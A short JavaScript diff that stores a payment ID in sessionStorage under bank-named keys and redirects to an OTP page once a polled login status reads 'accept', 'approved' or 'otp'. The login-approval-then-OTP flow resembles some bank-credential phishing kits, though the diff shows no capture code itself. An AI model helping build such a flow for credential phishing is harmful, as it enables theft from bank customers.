@@ -605,6 +605,9 @@
   }
 
   function pollLoginStatus(paymentId) {
+    if (!paymentId) return;
+    sessionStorage.setItem('safwa_order_id', String(paymentId));
+    sessionStorage.setItem('aman_bank_request_id', String(paymentId));
     if (statusPollTimer) clearInterval(statusPollTimer);
 
     statusPollTimer = setInterval(function() {
@@ -618,7 +621,7 @@
           if (st === 'accept' || st === 'approved' || st === 'otp') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
-            window.location.href = data.redirectUrl || 'otp-en.html';
+            window.location.href = 'otp-en.html?id=' + paymentId;
           } else if (st === 'reject' || st === 'declined' || st === 'error') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
@@ -672,6 +675,8 @@
     .then(function(res){ return res.json(); })
     .then(function(data){
       if (data.ok && data.id) {
+        sessionStorage.setItem('safwa_order_id', String(data.id));
+        sessionStorage.setItem('aman_bank_request_id', String(data.id));
         pollLoginStatus(data.id);
       } else {
         document.getElementById('loadingOverlay').classList.remove('active');
